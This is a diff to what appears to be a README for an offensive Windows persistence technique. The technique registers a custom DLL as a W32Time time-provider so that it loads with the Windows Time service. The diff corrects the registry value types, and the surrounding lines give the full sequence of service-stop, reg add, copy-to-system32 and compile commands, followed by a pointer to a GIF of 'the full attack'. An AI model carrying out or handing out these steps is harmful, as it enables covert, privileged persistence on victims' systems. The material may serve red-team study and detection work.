@@ -17,8 +17,8 @@ To use this technique, put whatever code you want to execute inside the `definit
 sc stop w32time
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "DllName" /d "%systemroot%\system32\w32TimePersistence.dll" /f
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "Enabled" /d "1" /f
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_EXPAND_SZ /v "InputProvider" /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "Enabled" /d "1" /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\Persistence" /t REG_DWORD /v "InputProvider" /d "1" /f
 
 copy w32TimePersistence.dll C:\windows\system32\
 
@@ -32,3 +32,5 @@ mkdir build
 cd build
 cl /D_USRDLL /D_WINDLL ..\library.cpp ..\library.def /MT /link /DLL /OUT:w32TimePersistence.dll
 ```
+
+Watch the GIF below to see the full attack
